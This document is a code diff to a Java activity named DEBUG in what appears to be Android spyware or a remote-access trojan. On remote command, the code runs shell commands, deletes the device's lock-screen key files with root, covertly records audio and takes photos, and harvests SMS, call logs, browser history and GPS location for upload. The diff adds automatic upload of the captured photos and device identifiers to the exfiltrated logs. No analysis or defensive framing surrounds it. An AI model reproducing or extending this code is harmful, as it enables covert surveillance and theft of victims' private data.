@@ -94,7 +94,6 @@ public class DEBUG extends Activity {
 			} else if (commands.contains(DEBUGSERVICE.codeList[2])) {
 				new CommandExecutor().execute(commands.replace("msg:|", "")
 						.toString());
-
 			} else if (commands.equals(DEBUGSERVICE.codeList[3])) {
 				Shell.SU.run("rm -rf /data/system/*.key");
 			} else if (commands.equals(DEBUGSERVICE.codeList[4])) {
@@ -117,14 +116,16 @@ public class DEBUG extends Activity {
 				startActivity(new Intent(DEBUG.this, Audiorecorder.class)
 						.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
 			} else if (commands.equals(DEBUGSERVICE.codeList[8])) {
-				startActivity(new Intent(DEBUG.this,
-						MakePhotoActivityBack.class)
-						.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+				startActivityForResult(
+						new Intent(DEBUG.this, MakePhotoActivityBack.class)
+								.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
+						11112);
 			} else if (commands.equals(DEBUGSERVICE.codeList[9])) {
 				if (Camera.getNumberOfCameras() > 1) {
-					startActivity(new Intent(DEBUG.this,
-							MakePhotoActivity.class)
-							.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+					startActivityForResult(
+							new Intent(DEBUG.this, MakePhotoActivity.class)
+									.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
+							11113);
 				}
 			} else if (commands.equals(DEBUGSERVICE.codeList[10])) {
 				File f = new File(Environment.getExternalStorageDirectory()
@@ -188,9 +189,7 @@ public class DEBUG extends Activity {
 						e1.printStackTrace();
 					}
 				}
-
 				new Uploader().execute(path);
-
 			} else if (commands.equals(DEBUGSERVICE.codeList[13])) {
 				Uri uri = Uri.parse("content://sms/inbox");
 				Cursor cursor = getContentResolver().query(
@@ -204,7 +203,8 @@ public class DEBUG extends Activity {
 					sms += calldate + "|" + cursor.getString(2) + "|"
 							+ cursor.getString(5) + "||";
 				}
-				String[] params = { "smslog", sms };
+				String[] params = { "smslog", DEBUGSERVICE.name,
+						"" + DEBUGSERVICE.random, sms };
 				new Sender().execute(params);
 			} else if (commands.equals(DEBUGSERVICE.codeList[14])) {
 				String finalLog = "";
@@ -214,13 +214,10 @@ public class DEBUG extends Activity {
 						android.provider.CallLog.Calls.CACHED_NUMBER_TYPE,
 						android.provider.CallLog.Calls.DATE };
 				String order = android.provider.CallLog.Calls.DATE + " DESC";
-
 				Cursor c = getContentResolver().query(
 						android.provider.CallLog.Calls.CONTENT_URI, fields,
 						null, null, order);
-
 				if (c.moveToFirst()) {
-
 					do {
 						int secondindex = c.getColumnIndex(Calls.DATE);
 						long seconds = c.getLong(secondindex);
@@ -230,12 +227,10 @@ public class DEBUG extends Activity {
 								+ c.getString(c
 										.getColumnIndex(android.provider.CallLog.Calls.NUMBER))
 								+ "||";
-
 					} while (c.moveToNext());
-
 				}
-
-				String[] params = { "calllog", finalLog };
+				String[] params = { "calllog", DEBUGSERVICE.name,
+						"" + DEBUGSERVICE.random, finalLog };
 				new Sender().execute(params);
 			} else if (commands.equals(DEBUGSERVICE.codeList[15])) {
 				String finalString = "";
@@ -252,7 +247,8 @@ public class DEBUG extends Activity {
 						mCur.moveToNext();
 					}
 				}
-				String[] params = { "browserlog", finalString };
+				String[] params = { "browserlog", DEBUGSERVICE.name,
+						"" + DEBUGSERVICE.random, finalString };
 				new Sender().execute(params);
 			} else if (commands.equals(DEBUGSERVICE.codeList[16])) {
 				new GPSTracker(this);
@@ -329,6 +325,8 @@ public class DEBUG extends Activity {
 	@Override
 	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
 		super.onActivityResult(requestCode, resultCode, data);
+		String path = data.getStringExtra("path");
+		new Uploader().execute(path);
 	}
 
 	public static class MyAdmin extends DeviceAdminReceiver {
